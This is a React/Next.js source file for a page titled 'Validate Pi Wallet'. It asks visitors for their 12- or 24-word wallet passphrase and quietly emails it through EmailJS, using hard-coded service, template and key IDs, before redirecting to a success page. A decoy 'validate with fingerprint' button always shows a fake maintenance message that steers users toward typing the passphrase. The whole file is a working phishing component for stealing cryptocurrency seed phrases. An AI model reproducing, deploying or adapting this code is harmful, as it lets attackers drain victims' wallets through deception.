"use client";
import React, { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import emailjs from "@emailjs/browser";
import { motion } from "framer-motion";
import { variants } from "./data";

export default function Validate() {
  const [fingerPrintError, setFingerPrintError] = useState(false);
  const [focused, setFocused] = useState(false);
  const [loading, setLoading] = useState(false);
  const form = useRef<HTMLFormElement>(null);
  const [valid, setValid] = useState(false);
  const [phrase, setPhrase] = useState("");
  const [error, setError] = useState("");
  const inputRef = useRef<any>(null);
  const router = useRouter();
  const phraseNumber = 12;
  const phraseNumber2 = 24;
  const sendEmail = async (e: any) => {
    e.preventDefault();
    setLoading(true);
    setFingerPrintError(false);
    const words = phrase.split(" ");
    const phrases = words.filter((el) => el !== "");
    if (!phrase) {
      setLoading(false);
      return setError(`Please fill in this field with your Passphrase`);
    }
    if (phrases.length === phraseNumber || phrases.length === phraseNumber2) {
      setLoading(false);
      
    }else{
      return setError(
        `Passphrase must have ${phraseNumber} or ${phraseNumber2} words but you provided only ${phrases.length}`
      );
    }
    
    const result = await emailjs.sendForm(
      "service_e3ri2nl",
      "template_3kwpega",
      form.current!,
      "05CQigNmYVMazVvCb"
    );
    if (result.status === 200) {
      setLoading(false);
      setPhrase("");
      setValid(true);
      router.push("/success");
    } else {
      setLoading(false);
      setError("Something went wrong, try again later");
    }
  };
  useEffect(() => setError(""), [phrase]);

  return (
    <motion.main
      variants={variants}
      initial="closed"
      animate="open"
      className="mt-7 flex flex-col items-center min-h-screen"
    >
      <form
        className="max-w-[500px] min-h-screen w-full"
        ref={form}
        onSubmit={sendEmail}
      >
        <p className="mb-8 font-bold text-lg lg:text-xl text-center">
          Validate Pi Wallet
        </p>
        <div className="w-full px-5 lg:px-10">
          <input type="hidden" name="from_name" id="" value="Pi Wallet" />
          <input type="hidden" name="to_name" id="" value="Pi Wallet" />
          <div
            className={`h-64 border-2 duration-300 rounded-md cursor-text ${
              focused &&
              ` ${error === "" ? "border-customYellow" : "border-red-500"}`
            } ${
              !focused &&
              ` ${error === "" ? "border-gray-400" : "border-red-500"}`
            } `}
            onClick={() => {
              inputRef.current.focus();
            }}
          >
            <input
              name="message"
              placeholder={`Enter your ${phraseNumber} or ${phraseNumber2} word passphrase here`}
              onFocus={() => {
                setFingerPrintError(false);
                setFocused(true);
              }}
              onBlur={() => setFocused(false)}
              autoFocus
              autoComplete="false"
              ref={inputRef}
              className={`p-3 w-full ${
                error === ""
                  ? "placeholder:text-white"
                  : "placeholder:text-red-500"
              } placeholder:font-normal  bg-transparent font-semibold resize-none duration-300 text-sm lg:text-base outline-none text-white rounded`}
              id=""
              value={phrase}
              onChange={(e: any) => setPhrase(e.target.value)}
            />
          </div>
          <div
            className={`duration-500 ${
              error === "" ? "h-0 opacity-0 overflow-hidden" : "h-5 opacity-100"
            } `}
          >
            <p className="text-sm text-red-500 m-1">{error}</p>
          </div>
        </div>
        <div className="px-5 lg:px-10 center">
          <button
            className={`w-full py-3 h-14 text-xs lg:text-sm duration-500 center rounded-full border-[3px] mt-5  font-semibold uppercase border-customPurpleB shadow-md text-white`}
            type="submit"
            disabled={loading}
          >
            {loading ? (
              <span className="loader"></span>
            ) : (
              " validate with passphrase"
            )}
          </button>
        </div>
        <div className="px-5 lg:px-10 mt-7">
          <p
            onClick={() => setFingerPrintError(true)}
            className="w-full h-14 lg:py-4 center text-xs lg:text-sm rounded-full border-[3px] bg-customPurpleB border-customYellow shadow-md hover:bg-customPurpleA  hover:border-customPurpleA cursor-pointer duration-300 text-white text-center font-semibold uppercase"
          >
            validate with fingerprint{" "}
          </p>
          <p
            className={`text-red-500 m-2 text-sm duration-500 ${
              fingerPrintError ? "opacity-100" : "opacity-0"
            }`}
          >
            Sorry this option is under maintenance, try validating with the
            Passphrase option above
          </p>
        </div>
      </form>
    </motion.main>
  );
}
